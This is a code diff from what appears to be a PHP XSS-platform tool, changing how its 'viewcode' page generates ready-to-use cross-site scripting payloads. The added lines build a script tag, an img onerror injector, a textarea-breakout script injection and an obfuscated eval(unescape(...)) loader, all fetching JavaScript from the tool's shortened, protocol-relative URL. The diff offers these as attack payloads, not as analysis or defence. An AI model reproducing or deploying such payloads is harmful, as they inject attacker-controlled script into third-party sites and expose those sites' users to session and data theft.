@@ -230,15 +230,15 @@ case 'viewcode':
     //转短地址
     $longUrl = URL_ROOT . "/" . $project['urlKey'] . "?" . time();
     $longUrl2 = URL_ROOT . "/" . $project['urlKey'] . "?";
-    $shortUrl = LongUrltoShortUrl($longUrl);//短网址1
+    $shortUrl = preg_replace('/^(http:\/\/|https:\/\/)/', '//', LongUrltoShortUrl($longUrl));//短网址1
     $shortShow1 = StripStr("<script src=" . $shortUrl . "></script>");
-    $shortShow3 = StripStr("<img src=x onerror=s=createElement('script');body.appendChild(s);s.src='你的js地址';>");
-    $scriptShow1 = StripStr("</textarea>'\"><script src=" . $longUrl . "></script>");
+    $shortShow3 = StripStr("<img src=x onerror=s=document.createElement('script');document.body.appendChild(s);s.src='$shortUrl';>");
+    $scriptShow1 = StripStr("</textarea>'\"><script src=" . $shortUrl . "></script>");
     //$scriptShow1=StripStr("</textarea>'\"><script src=".URL_ROOT."/{$project[urlKey]}?".time()."></s
     //    cript>");
-    $code2 = 'var b=document.createElement("script");b.src="' . $longUrl2 . '"+Math.random();(document.getElementsByTagName("HEAD")[0]||document.body).appendChild(b);';
+    $code2 = 'var b=document.createElement("script");b.src="' . $shortUrl . '"+Math.random();(document.getElementsByTagName("HEAD")[0]||document.body).appendChild(b);';
     //$code2='var b=document.createElement("script");b.src="'.URL_ROOT."/{$project[urlKey]}?".'"+Math.random();(document.getElementsByTagName("HEAD")[0]||document.body).appendChild(b);';
-    $scriptShow2 = StripStr("</textarea>'\"><img src=# id=xssyou style=display:none onerror=eval(unescape(/" . rawurlencode($code2) . "/.source));//>");
+    $scriptShow2 = StripStr("</textarea>'\"><img src=# id=branderx style=display:none onerror=eval(unescape(/" . rawurlencode($code2) . "/.source));//>");
 
     include 'common.php';
     $smarty = InitSmarty();
